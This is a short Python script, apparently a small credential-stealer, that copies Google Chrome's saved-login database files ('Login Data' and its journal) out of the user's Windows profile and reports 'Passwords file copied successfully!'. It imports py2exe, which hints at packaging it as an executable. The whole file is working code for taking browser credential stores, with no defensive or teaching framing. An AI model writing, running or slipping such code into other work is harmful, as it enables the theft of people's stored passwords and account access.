import os, shutil, sys, getpass, py2exe

#it copies the chrome login data and login data-journal files to desktop
def get_passwords():
	#copying Login Data file
	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data"
	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Login Data"
	shutil.copyfile(data_path, final_path)

	#copying Login Data-journal file
	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data-journal"
	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Login Data-journal"
	shutil.copyfile(data_path, final_path)
	print("Passwords file copied successfully!")

try:
	get_passwords()
except PermissionError:
	print("Permission Denied")
	print(sys.exc_info())
